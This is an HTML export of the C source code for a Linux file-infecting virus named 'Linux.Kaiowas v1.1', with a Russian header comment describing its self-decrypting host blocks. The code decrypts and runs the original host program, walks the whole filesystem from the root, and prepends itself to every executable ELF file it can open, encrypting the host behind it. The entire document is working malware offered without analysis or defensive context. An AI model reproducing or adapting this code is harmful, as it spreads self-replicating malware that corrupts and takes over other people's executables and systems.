<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//
//                           &lt;Linux.Kaiowas v1.1&gt;
//
// Оптимизированная и дополненная версия вируса. Теперь дописываемые блоки
// оригинального файла шифруются с переменным ключом, который нигде не
// сохраняется, а подбирается при помощи четырехбайтных контрольных сумм блока
// при расшифровке оного блока (RDA). Эти контрольные суммы хранятся перед
// блоком, который они представляют, в зашифрованном теле оригинального файла.
//
// 20.04.01                                      (c) Gobleen Warrior//SMF
</span><span class="sc0">
</span><span class="sc9">#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define virus_len 9552
#define byte_block virus_len
#define name_len sizeof(our_name)
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">our_name</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Linux.Kaiowas v1.1 by Gobleen Warrior//SMF"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">our_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tmp_fd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">byte_block</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">buffer1</span><span class="sc10">[</span><span class="sc11">byte_block</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">vir_buf</span><span class="sc10">[</span><span class="sc11">virus_len</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">envp</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">exec_tmp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ssize_t</span><span class="sc0"> </span><span class="sc11">bytes_cnt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">pid_t</span><span class="sc0"> </span><span class="sc11">pid</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">our_fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">our_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vir_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_len</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">exec_tmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tempnam</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tmp_fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">exec_tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_WRONLY</span><span class="sc10">|</span><span class="sc11">O_CREAT</span><span class="sc10">|</span><span class="sc11">O_TRUNC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0400</span><span class="sc10">|</span><span class="sc4">0200</span><span class="sc10">|</span><span class="sc4">0100</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">our_fd</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc11">csum0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">our_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">csum0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">bytes_cnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">our_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">byte_block</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bytes_cnt</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(;;)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc11">csum</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">bytes_cnt</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">buffer1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">our_name</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">name_len</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">bytes_cnt</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">buffer1</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">31</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">csum0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bytes_cnt</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">our_fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fork</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pid</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">execve</span><span class="sc10">(</span><span class="sc11">exec_tmp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">envp</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pid</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">process_file</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ftw</span><span class="sc10">(</span><span class="sc6">"/"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">process_file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc2">//main
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">process_file</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">status</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">type</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vic_perm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bytes_cnt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">vic_perm</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">status</span><span class="sc10">-&gt;</span><span class="sc11">st_mode</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">status</span><span class="sc10">-&gt;</span><span class="sc11">st_mode</span><span class="sc10">&amp;</span><span class="sc11">S_IFREG</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">status</span><span class="sc10">-&gt;</span><span class="sc11">st_mode</span><span class="sc10">&amp;(</span><span class="sc11">S_IXUSR</span><span class="sc10">|</span><span class="sc11">S_IXGRP</span><span class="sc10">|</span><span class="sc11">S_IXOTH</span><span class="sc10">)))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmp_name</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">S_IRUSR</span><span class="sc10">|</span><span class="sc11">S_IWUSR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">vic_fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_perm</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">tmp_name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tempnam</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"GWI"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">tmp_fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">tmp_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_WRONLY</span><span class="sc10">|</span><span class="sc11">O_CREAT</span><span class="sc10">|</span><span class="sc11">O_TRUNC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0400</span><span class="sc10">|</span><span class="sc4">0200</span><span class="sc10">|</span><span class="sc4">0100</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">vic_fd</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_perm</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">bytes_cnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">vic_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">byte_block</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">vic_fd</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">tmp_name</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_perm</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bytes_cnt</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">name_len</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;(</span><span class="sc11">buffer</span><span class="sc10">+</span><span class="sc11">byte_block</span><span class="sc10">-</span><span class="sc11">name_len</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((!</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">our_name</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strncmp</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ELF"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">vic_fd</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">tmp_name</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_perm</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">vic_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vir_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">virus_len</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">our_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">bytes_cnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">vic_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">byte_block</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc2">// En-crypt
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc11">csum</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">bytes_cnt</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">csum</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">31</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">bytes_cnt</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc11">buffer</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">our_name</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">name_len</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">// } en-crypt
</span><span class="sc0">            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">csum</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">


            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bytes_cnt</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">vic_fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rename</span><span class="sc10">(</span><span class="sc11">tmp_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">tmp_fd</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">unlink</span><span class="sc10">(</span><span class="sc11">tmp_name</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_perm</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">chmod</span><span class="sc10">(</span><span class="sc11">vic_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">vic_perm</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc2">//process_file
</span></div></body>
</html>
